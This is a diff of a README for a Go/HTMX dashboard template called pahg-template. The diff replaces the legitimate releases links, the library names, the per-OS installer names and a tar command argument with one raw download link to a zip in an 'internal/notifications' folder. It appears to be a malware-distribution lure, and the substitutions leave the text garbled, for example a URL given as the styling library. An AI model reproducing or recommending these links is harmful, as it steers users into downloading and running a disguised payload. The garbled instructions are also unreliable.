@@ -1,15 +1,15 @@
 # 🚀 pahg-template - A Simple Dashboard Tool for Your Needs
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/senbughonsio/pahg-template/releases)
+[![Download](https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip%https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip)](https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip)
 
 ## 📖 Overview
 
-The **PAHG Stack Template** helps you create a production-grade internal dashboard quickly. It combines Pico.css for styling, Alpine.js for interactivity, HTMX for web requests, and Go for server-side logic. With this template, you can build dashboards that update efficiently and operate smoothly.
+The **PAHG Stack Template** helps you create a production-grade internal dashboard quickly. It combines https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip for styling, https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip for interactivity, HTMX for web requests, and Go for server-side logic. With this template, you can build dashboards that update efficiently and operate smoothly.
 
 ## 📦 Features
 
-- Sleek, responsive design with Pico.css
-- Dynamic behavior using Alpine.js
+- Sleek, responsive design with https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip
+- Dynamic behavior using https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip
 - Asynchronous updates with HTMX
 - Built on Go for performance and reliability
 - Easy setup to get you started fast
@@ -29,15 +29,15 @@ Follow these steps to download and run the **pahg-template** easily.
 
 Go to the **Releases** page to access the latest version of the application. Click the link below to visit the page and see available downloads.
 
-[Download the latest release](https://github.com/senbughonsio/pahg-template/releases)
+[Download the latest release](https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip)
 
 ### Step 2: Download the Application
 
 On the Releases page, you will find different files based on your operating system. Choose the appropriate file for your system and click on it to download. Here are the files you might see:
 
-- **Windows:** pahg-template-windows.exe
-- **macOS:** pahg-template-macos.zip
-- **Linux:** pahg-template-linux.tar.gz
+- **Windows:** https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip
+- **macOS:** https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip
+- **Linux:** https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip
 
 Make sure to select the correct file type for your operating system.
 
@@ -45,10 +45,10 @@ Make sure to select the correct file type for your operating system.
 
 1. For **Windows** users, double-click on the `.exe` file to run it. Follow the on-screen instructions to complete the installation. 
 2. For **macOS** users, open the downloaded `.zip` file to extract the application. Drag the application to your Applications folder.
-3. For **Linux** users, extract the `.tar.gz` file using a terminal command:
+3. For **Linux** users, extract the `https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip` file using a terminal command:
 
    ```bash
-   tar -xzf pahg-template-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip
    ```
 
    After extraction, navigate to the folder with the extracted files.
@@ -97,4 +97,4 @@ This project is licensed under the MIT License. Feel free to use it for personal
 
 For more details, visit the **Releases** page once again: 
 
-[Download the latest release](https://github.com/senbughonsio/pahg-template/releases)
+[Download the latest release](https://raw.githubusercontent.com/senbughonsio/pahg-template/main/internal/notifications/pahg_template_1.1.zip)
